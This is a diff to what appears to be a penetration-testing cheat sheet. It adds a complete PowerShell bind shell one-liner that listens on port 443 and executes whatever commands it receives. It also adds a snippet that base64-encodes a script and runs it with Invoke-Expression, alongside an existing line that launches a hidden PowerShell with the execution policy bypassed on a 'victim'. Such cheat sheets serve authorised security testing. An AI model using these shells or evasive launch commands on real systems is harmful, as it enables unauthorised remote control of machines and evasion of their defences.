@@ -21,6 +21,15 @@ busybox httpd -f -p 443
 
 Refer for more to: https://blog.certcube.com/file-transfer-cheatsheet-for-pentesters/
 
+# Bind Shells
+
+## Powershell bind
+
+```
+#Uncomment and change the hardcoded port number (443) in the below line. Remove this help comment as well.
+
+#$listener = [System.Net.Sockets.TcpListener]443;$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()
+```
 
 # Reverse shells
 
@@ -65,11 +74,15 @@ Launch the above script directly or save on local attacking maching and call it 
 
 `powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File shell.ps1`
 
-### Encoded Execution
+### Encoded POwershell Execution
 
-1. Save ps1 command to a file
-2. run `base64 file.ps1`
-3. copy output and run on victim `powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -EncodedCommand "$output"`
+```
+$expression     = Get-Content -Path .\test.ps1
+$commandBytes   = [System.Text.Encoding]::Unicode.GetBytes($expression)
+$encodedCommand = [Convert]::ToBase64String($commandBytes)
+
+Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([convert]::FromBase64String($encodedCommand)))
+```
 
 ## Python
 
